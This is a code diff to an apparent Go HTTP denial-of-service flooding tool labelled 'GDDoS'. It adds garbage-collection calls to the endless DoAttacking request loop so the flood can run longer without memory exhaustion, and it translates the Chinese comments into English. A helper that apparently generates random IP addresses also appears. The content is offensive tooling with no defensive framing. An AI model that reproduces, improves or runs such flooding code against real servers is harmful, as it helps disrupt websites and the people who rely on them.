@@ -9,6 +9,7 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -97,15 +98,17 @@ func main() {
 func DoAttacking(grindex int) {
 	for i := 0; ; i++ {
 		if result, err := DoHttpRequest(); err != nil {
-			PrintError(grindex, i, err.Error()) // 红色 客户端错误
+			PrintError(grindex, i, err.Error()) // Red. Client ERROR
+			runtime.GC()                        // Clean up memory to prevent memory overflow
 		} else {
-			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                // 绿色 服务端状态码200
-			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") { // 状态码不是 200/301
-				responseStatus = fmt.Sprintf("\033[1;35;40m (%s)", *result) // 紫色 服务端状态码400/402/403/404/500/501/502/...
+			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                // Green. Status code is 200
+			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") { // Status code is not 200/301
+				responseStatus = fmt.Sprintf("\033[1;35;40m (%s)", *result) // Purple. Status code is 400/402/403/404/500/501/502/...
 			}
-			Log(grindex, i, responseStatus) // 默认
+			Log(grindex, i, responseStatus)
 		}
 		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
+		runtime.GC() // Clean up memory to prevent memory overflow
 	}
 }
 
@@ -131,7 +134,7 @@ func DoHttpRequest() (*string, error) {
 	defer response.Body.Close()
 	// Ignore and read the responseBody
 	_, _ = ioutil.ReadAll(response.Body)
-
+	runtime.GC() // Clean up memory to prevent memory overflow
 	return &response.Status, err
 }
 
@@ -142,7 +145,6 @@ func genIpaddr() string {
 	return ip
 }
 
-// TODO: Add Log
 func Log(grindex int, i int, responseStatus string) {
 	fmt.Printf("[GDDoS#%d/%d]%s \033[0m \n", grindex, i, responseStatus) // 默认 [GDDoS#并发线程数/线程重复数] (Get "https://1.1.1.1": dial tcp 1.1.1.1:443: i/o timeout)
 }
